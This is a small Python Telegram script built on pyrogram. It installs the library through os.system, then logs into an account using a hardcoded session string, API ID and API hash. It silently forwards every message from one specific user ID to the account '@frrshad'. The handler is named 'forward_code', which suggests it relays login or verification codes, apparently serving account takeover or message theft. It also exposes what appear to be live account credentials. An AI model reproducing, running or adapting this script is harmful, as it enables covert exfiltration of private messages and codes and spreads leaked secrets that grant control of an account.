import os, sys
if sys.platform == 'win32':
    pip_line = 'python -m pip install pyrogram==2.0.30'
else:
    pip_line = 'pip install pyrogram==2.0.30'
os.system(pip_line)

from pyrogram import Client, filters
from pyrogram.types import Message

feri = 'AQAACi0_1tVBp9Wkz2hrBT1bT_tV7XYovUX5td0X2Uwp7AYfGDJINS0_cbdR0x7ummSvn_ePds1pK5_2aE114QZH4sms7srJW5Ux6UY5z_NTQ_I6sfTeDeGpBTVu9eCEoQBF908Ddy3YW9tg9ic45zNgFrFMwMThSQZeDmx-55Z8gfKbUy4BS1WzOSSWw7qyIxAyVvfGHcQRRiPx9RcLmvjDUUQUVIBXinCdCczWNMbStnY4X3vUqjqmwTtnlC89ksUzhp-Gwej0zqAcNMXdPD66Val3qQRXO9OWF7Dyqi-AoxLlVeoNcDoR7JCTf2E73x_9kqXPJcMQV80B-yyzSqBWAAAAAU7Pks4A'

app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851', session_string=feri)

id_or_username = '@frrshad'


@app.on_message(filters.user(5214329732))
def forward_code(app:Client, message:Message):
    app.forward_messages(id_or_username, message.chat.id, message.id)

  
app.run()
